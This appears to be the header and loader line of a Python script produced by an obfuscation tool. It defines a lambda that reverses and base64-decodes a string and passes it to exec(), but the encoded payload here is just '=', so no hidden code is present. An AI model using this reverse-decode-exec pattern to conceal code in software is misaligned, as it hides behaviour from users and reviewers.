# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Tue Aug  8 11:56:39 2023
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))